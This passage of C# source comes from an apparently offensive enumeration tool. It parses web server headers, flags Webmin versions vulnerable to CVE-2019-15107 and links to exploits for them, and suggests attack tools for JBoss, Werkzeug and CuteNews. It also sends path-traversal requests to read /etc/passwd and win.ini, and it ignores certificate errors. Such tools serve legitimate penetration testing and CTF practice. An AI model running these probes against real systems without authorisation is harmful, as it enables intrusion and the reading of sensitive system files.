                        // 1.890, 1.900-1.920 - http://www.webmin.com/changes.html
                        if (serverText.StartsWith("MiniServ/1.890") || serverText.StartsWith("MiniServ/1.900") || serverText.StartsWith("MiniServ/1.910") || serverText.StartsWith("MiniServ/1.920"))
                        {
                            responseText += "--- " + "Version Likely vulnerable to CVE-2019-15107!!".Pastel(Color.Orange) + Environment.NewLine;
                            responseText += "---- git clone https://github.com/MuirlandOracle/CVE-2019-15107 OR https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/webmin_backdoor.rb" + Environment.NewLine;
                        }
                    }
                    else if (serverText.StartsWith("Werkzeug/"))
                    {
                        responseText += "-- " + "Werkzeug Detected - Check out /console <-----".Pastel(Color.Orange) + Environment.NewLine;
                    }
                }
                // Useful info
                if (headerList.Contains("X-Powered-By"))
                {
                    headerList.Remove("X-Powered-By");
                    string poweredBy = Headers.Get("X-Powered-By");
                    responseText += "- X-Powered-By: " + poweredBy + Environment.NewLine;
                    if (poweredBy.Contains("JBoss"))
                    {
                        responseText += "-- " + "JBoss Detected - Run jexboss - https://github.com/joaomatosf/jexboss <-----".Pastel(Color.Orange) + Environment.NewLine;
                    }
                }
                if (headerList.Contains("X-Generator"))
                {
                    headerList.Remove("X-Generator");
                    string generator = Headers.Get("X-Powered-By");
                    responseText += "- X-Generator: " + generator + Environment.NewLine;
                }
                // Requires a login
                if (headerList.Contains("WWW-Authenticate"))
                {
                    headerList.Remove("WWW-Authenticate");
                    responseText += "- WWW-Authenticate: " + Headers.Get("WWW-Authenticate") + Environment.NewLine;
                }
                // Kabana
                if (headerList.Contains("kbn-name"))
                {
                    headerList.Remove("kbn-name");
                    responseText += "- kbn-name: " + Headers.Get("kbn-name") + Environment.NewLine;
                    responseText += "-- You should get more kibana-based info further down" + Environment.NewLine; ;
                }
                if (headerList.Contains("kbn-version"))
                {
                    headerList.Remove("kbn-version");
                    responseText += "- kbn-version: " + Headers.Get("kbn-version") + Environment.NewLine;
                }
                // Useful cookies
                if (headerList.Contains("Set-Cookie"))
                {
                    headerList.Remove("Set-Cookie");
                    string setCookie = Headers.Get("Set-Cookie");
                    responseText += "- Set-Cookie: " + setCookie + Environment.NewLine;
                    if (setCookie.StartsWith("CUTENEWS_SESSION"))
                    {
                        responseText += "-- " + $"CuteNews Found - Browse to http://{DNS}/CuteNews/index.php".Pastel(Color.Orange) + Environment.NewLine;
                    }
                }
                // Fun content types
                if (headerList.Contains("Content-Type"))
                {
                    string contentType = Headers.Get("Content-Type");
                    if (contentType.StartsWith("text/html"))
                    {
                        // Skip it
                    }
                    else if (contentType.StartsWith("image"))
                    {
                        // The entire thing is an image - It's special!
                        responseText += "- Content Type: " + Headers.Get("Content-Type").Pastel(Color.Orange) + " <--- It's an image!" + Environment.NewLine;
                    }
                    else
                    {
                        // A unique content type - Might be interesting
                        responseText += "- Content-Type: " + Headers.Get("Content-Type") + Environment.NewLine;
                    }
                }
                responseText += "- Other Headers: " + string.Join(",", headerList) + Environment.NewLine;
            }
            if (SSLCert != null)
            {
                X509Certificate2 theCert = SSLCert;
                string certIssuer = theCert.Issuer;
                string certSubject = theCert.Subject;
                // string certAltName = SSLCert.SubjectName.Name;
                responseText += "- SSL Cert Issuer: " + certIssuer + Environment.NewLine;
                responseText += "- SSL Cert Subject: " + certSubject + Environment.NewLine;
                if (theCert.Extensions != null)
                {
                    // Console.WriteLine("Extensions is not null");
                    X509ExtensionCollection extensionCollection = theCert.Extensions;
                    foreach (X509Extension extension in extensionCollection)
                    {
                        string friendlyName = extension.Oid.FriendlyName;
                        // Console.WriteLine("Extension Name: " + extensionType);
                        // Windows: Subject Alternative Name
                        // Linux: X509v3 Subject Alternative Name
                        if (friendlyName.Contains("Subject Alternative Name"))
                        {

                            AsnEncodedData asndata = new AsnEncodedData(extension.Oid, extension.RawData);
                            List<string> formattedValues = asndata.Format(true).Split(new[] { Environment.NewLine }, StringSplitOptions.None).ToList();
                            string itemList = "";
                            foreach (string item in formattedValues)
                            {
                                string theItem = item;
                                theItem = theItem.Replace("DNS Name=", "");
                                if (theItem.Contains("("))
                                {
                                    theItem = theItem.Remove(0, theItem.IndexOf("(") + 1).Replace(")", "");
                                    itemList += theItem + ",";
                                }
                                else
                                {
                                    itemList += theItem + ",";
                                }
                            }
                            itemList = itemList.Trim(',');
                            responseText += "- Subject Alternative Name: " + itemList + Environment.NewLine;
                        }
                    }
                }
            }
            // Clean off any redundant newlines
            responseText = responseText.TrimEnd(Environment.NewLine.ToCharArray());
            return responseText;
        }

        public static string TestBaseLFI(string ip, int port)
        {
            string result = General.BannerGrab(ip, port, "GET /../../../../../../etc/passwd HTTP/1.1" + Environment.NewLine + "Host: " + ip + Environment.NewLine + Environment.NewLine, 2500);
            if (result.Contains("root"))
            {
                return "- /etc/passwd File Found VIA Base LFI! --> GET /../../../../../../etc/passwd" + Environment.NewLine + result;
                // Need to format this better...

            }
            result = General.BannerGrab(ip, port, "GET /../../../../../../windows/win.ini HTTP/1.1" + Environment.NewLine + "Host: " + ip + Environment.NewLine + Environment.NewLine, 2500);
            if (result.Contains("for 16-bit app support"))
            {
                return "- /windows/win.ini File Found VIA Base LFI! --> GET /../../../../../../windows/win.ini" + Environment.NewLine + result;
            }
            return "";
        }

        public static bool BasicHTTPSTest(string target, int port)
        {
            try
            {
                // HttpWebRequest has the ability to ignore invalid SSL Certs - WebRequest doesn't
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://{target}:{port}/");
                // HEAD request - Faster
                request.Method = "HEAD";
                // Ignore invalid SSL Certs
                request.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                WebResponse r = request.GetResponse();
                return true;
            }
            catch
            {
                // Nope
                return false;
            }
        }
    }
}
